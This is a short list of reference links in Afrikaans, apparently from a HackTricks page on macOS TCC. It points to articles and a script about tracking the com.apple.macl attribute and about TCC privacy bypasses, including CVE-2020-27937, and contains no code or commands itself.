- [2] [maclTrack.command - script om com.apple.macl na te spoor (Gist deur brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Spoor com.apple.macl na en hanteer dit](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Omseiling van macOS TCC-gebruikersprivaatheidsbeskerming per ongeluk en volgens ontwerp](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Verander die tuisgids en omseil TCC, oftewel CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)

{{#include ../../../../banners/hacktricks-training.md}}
